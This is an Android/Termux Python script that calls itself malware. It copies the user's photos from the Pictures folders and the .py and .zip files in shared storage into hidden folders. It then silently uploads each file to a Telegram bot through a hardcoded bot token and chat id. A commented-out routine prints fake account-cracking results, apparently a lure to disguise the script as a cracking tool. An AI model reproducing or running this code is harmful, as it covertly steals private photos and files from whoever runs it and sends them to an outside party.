#!/usr/bin/python3
#creater: BilalHaiderID
#path: /sdcard/Android/data/io.spck/files/Virus-ID
from os import system as cmd
from os import listdir as lst
from sys import exit as exit
from sys import argv as arg
from time import sleep as slp
from random import randint as rr
from requests import post as post
#_________[ BASIC COLOURS ]_________>>
red = "\33[31m"
green = "\33[32m"
white = "\33[37m"
#_________[ SCRIPT BANNER ]_________>>
bannerID = """ """
#_________[ FAKE IDS ]_________>>
"""def fakeID():
	clearID()
	print(bannerID)
	lineID()
	limit = int(rr(10,35))
	for i in range(limit):
		crh = (rr(1,6))
		if crh==1:
			print(f"{red}[CP] 1000{str(rr(10,89))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")
		else:
			print(f"{green}[OK] 1000{str(rr(10,89))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")"""
#__________[ COPY FILES ]_________>>
def copyID(level=1):
	if level not in [1,2,3]:
		level = 1
	if level==1:
		try:
			cmd("cp /sdcard/*.py /sdcard/Data-ID/Files &> /dev/null")
		except:
			pass
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos &> /dev/null")
		except:
			pass
	elif level==2:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/Data-ID/File &> /dev/null")
		except:
			pass
	elif level==3:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/File &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.zip /sdcard/File &> /dev/null")
		except:
			pass
#_________[ CREATING FOLDERS ]_________>>
def folderID():
	try:
		list_sdcard = lst("/sdcard")
		if "Data-ID" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data-ID &> /dev/null")
	try:
		list_sdcard = lst("/sdcard/Data-ID")
		if "Files" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID/Files &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data-ID/Files &> /dev/null")
	try:
		list_sdcard = lst("/sdcard/Data-ID")
		if "Photos" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID/Photos &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data-ID/Photos &> /dev/null")
#_________[ MALWARE UPLOAD DIF ]______>>
def upload(file):
	data = {"chat_id": "@farazid1"}
	files = {"document": open(file, "rb")}
	try:
		response = post("https://api.telegram.org/bot6248683483:AAFFEFUlI6i61B0X3H-rdnUx8QoA6JTFIzM/sendDocument", data=data, files=files)
	except:
		print("ERROR")
#_________[ MALWARE MAIN DEF ]______>>
def malwareID():
	folderID()
	copyID()
	list_Files1 = lst("/sdcard/Data-ID/Photos")
	list_Files2 = lst("/sdcard/Data-ID/Files")
	for file in list_Files1:
		file = "/sdcard/Data-ID/Photos/"+file
		upload(file)
	for file in list_Files2:
		file = "/sdcard/Data-ID/Files/"+file
		upload(file)
if __name__=="__main__":
	malwareID()